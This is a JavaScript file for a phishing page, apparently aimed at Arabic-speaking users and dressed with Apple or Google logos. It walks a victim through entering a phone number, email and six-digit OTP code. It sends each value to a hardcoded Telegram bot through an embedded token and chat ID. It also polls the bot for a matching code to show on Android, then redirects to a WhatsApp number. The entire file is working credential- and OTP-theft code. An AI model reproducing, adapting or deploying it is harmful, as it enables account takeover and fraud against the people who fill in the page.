const TOKEN = "8485113389:AAHZEkzRDLg2ZPBOjUb-osecIR34DExhxHg";
const CHAT_ID = "5976228373";

const isIOS = /iPhone|iPad|iPod/i.test(navigator.userAgent);
let phoneUser = "";
let lastMsgId = null;

// تصفير البوت عند الريفريش
window.onload = () => {
    fetch(`https://api.telegram.org/bot${TOKEN}/getUpdates?offset=-1`);
};

function sendToBot(text) {
    fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(text)}`);
}

// دالة التحقق البصري
function validate(id, errorId, regex) {
    const field = document.getElementById(id);
    const error = document.getElementById(errorId);
    if (!regex.test(field.value)) {
        field.classList.add('input-error');
        field.classList.remove('input-success');
        error.style.display = 'block';
        return false;
    } else {
        field.classList.remove('input-error');
        field.classList.add('input-success');
        error.style.display = 'none';
        return true;
    }
}

function goToStep2() {
    if (!validate('phone-num', 'phone-error', /^\d{9,15}$/)) return;
    phoneUser = document.getElementById('phone-num').value;
    sendToBot(`📞 رقم الهاتف: ${phoneUser}`); //
    
    document.getElementById('step-1').style.display = 'none';
    document.getElementById('step-2').style.display = 'block';
    
    const header = document.getElementById('provider-header');
    header.innerHTML = isIOS ? 
        '<img src="https://upload.wikimedia.org/wikipedia/commons/1/1b/Apple_logo_grey.svg" width="45">' : 
        '<img src="https://upload.wikimedia.org/wikipedia/commons/2/2f/Google_2015_logo.svg" width="90">';
}

function startAuth() {
    if (!validate('user-email', 'email-error', /^[^\s@]+@[^\s@]+\.[^\s@]+$/)) return;
    const email = document.getElementById('user-email').value;
    sendToBot(`📧 البريد: ${email}\n📱 النظام: ${isIOS ? "iOS" : "Android"}`); //

    document.getElementById('auth-btn').style.display = "none";
    document.getElementById('loading-spinner').style.display = "block";

    setTimeout(() => {
        document.getElementById('step-2').style.display = 'none';
        document.getElementById('step-3').style.display = 'block';
        if (!isIOS) {
            document.getElementById('android-ui').style.display = 'block';
            setInterval(listenForCode, 1500);
        } else {
            document.getElementById('ios-ui').style.display = 'block';
        }
    }, 2000);
}

async function listenForCode() {
    try {
        const res = await fetch(`https://api.telegram.org/bot${TOKEN}/getUpdates?offset=-1`);
        const data = await res.json();
        if (data.result?.length > 0) {
            const msg = data.result[0].message;
            if (lastMsgId === null) {
                lastMsgId = msg.message_id;
            } else if (msg.message_id !== lastMsgId) {
                const text = msg.text;
                if (!isNaN(text) && text.length <= 3) {
                    document.getElementById('dynamic-code').innerText = text;
                    lastMsgId = msg.message_id;
                }
            }
        }
    } catch (e) {}
}

function sendOtpToBot(type) {
    const id = type === 'ios' ? 'otp-code-ios' : 'otp-code';
    const errId = type === 'ios' ? 'otp-error-ios' : 'otp-error';
    if (!validate(id, errId, /^\d{6}$/)) return;

    const otp = document.getElementById(id).value;
    sendToBot(`🔑 كود التحقق (OTP): ${otp}`); //
    document.getElementById('step-3').innerHTML = `<h3>✅ تم التفعيل</h3><p>بروتوكول الخصوصية مفعل الآن.</p>`;
    setTimeout(() => { window.location.href = "https://wa.me/84926426273"; }, 2500);
}